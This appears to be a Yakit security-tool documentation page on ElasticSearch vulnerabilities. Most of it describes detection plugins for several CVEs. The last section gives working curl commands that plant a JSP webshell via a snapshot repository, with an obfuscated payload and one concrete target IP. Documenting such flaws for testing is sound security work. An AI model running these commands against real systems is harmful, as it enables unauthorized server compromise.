---
sidebar_position: 17
---
# ElasticSearch

## 1 CVE-2014-3120 远程代码执行漏洞检测

**插件id：**

e8518ead-d759-4789-9531-73cb88c4eda7

**测试过程：**

将测试网站地址输入到该插件扫描目标栏，修改插件的额外参数添加端口号
插件成功检测到该漏洞

![](/img/products/yakit/ElasticSearch-1.png)

## 2 CVE-2015-1427 远程代码执行漏洞检测

**插件id：**

77975554-aa02-4d5d-b6dc-e960090b7288

**测试过程：**

将测试网站地址输入到该插件扫描目标栏，修改插件的额外参数添加端口号
插件成功检测到该漏洞

![](/img/products/yakit/ElasticSearch-2.png)

## 3 CVE-2015-3337 目录穿越漏洞检测

**插件id：**

4da6b591-5b7f-46b3-8f5c-84af1445e32c

**测试过程：**

将测试网站地址输入到该插件扫描目标栏，修改插件的额外参数添加端口号
插件成功检测到该漏洞

![](/img/products/yakit/ElasticSearch-3.png)

## 4 CVE-2015-5531 目录遍历与文件读取漏洞检测

**插件id：**

Yakit正在努力编写~

**测试过程：**

将测试网站地址输入到该插件扫描目标栏，修改插件的额外参数添加端口号
插件成功检测到该漏洞

![](/img/products/yakit/ElasticSearch-4.png)

## 5 WooYun-2015-110216 写入webshell漏洞

**插件id：**

Yakit正在努力编写~

**测试过程：**

首先创建一个恶意索引文档：

```go
curl -XPOST http://185.238.248.179:9200/yz.jsp/yz.jsp/1 -d'
{"<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%>":"test"}
'
```

再创建一个恶意的存储库，其中location的值即为我要写入的路径。

```go
curl -XPUT 'http://xx.x.x.xxx:xxxx/_snapshot/yz.jsp' -d '{
     "type": "fs",
     "settings": {
          "location": "/usr/local/tomcat/webapps/wwwroot/",
          "compress": false
     }
}'
'
```

存储库验证并创建:

```go
curl -XPUT "http://xx.x.x.xxx:xxxx/_snapshot/yz.jsp/yz.jsp" -d '{
     "indices": "yz.jsp",
     "ignore_unavailable": "true",
     "include_global_state": false
}'
```

![](/img/products/yakit/ElasticSearch-5.png)

访问http://xx.x.x.xxx:xxxx//wwwroot/indices/yz.jsp/snapshot-yz.jsp
这就是我们写入的webshell
该shell的作用是向wwwroot下的test.jsp文件中写入任意字符串
如：http://xx.x.x.xxx:xxxx/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success，我们再访问/wwwroot/test.jsp就能看到success了

![](/img/products/yakit/ElasticSearch-6.png)
